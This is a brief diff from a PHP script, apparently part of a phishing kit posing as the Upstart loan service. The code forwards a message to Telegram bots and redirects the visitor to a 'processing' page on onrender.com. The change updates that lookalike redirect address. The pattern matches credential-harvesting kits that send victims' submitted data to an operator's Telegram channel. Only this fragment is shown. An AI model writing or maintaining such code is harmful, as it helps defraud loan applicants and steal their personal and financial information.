@@ -90,7 +90,7 @@ sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
-header("Location:https://upstartloan.onrender.com/processing.html");
+header("Location:https://upstartloans.onrender.com/processing.html");
 
 exit; 
 }
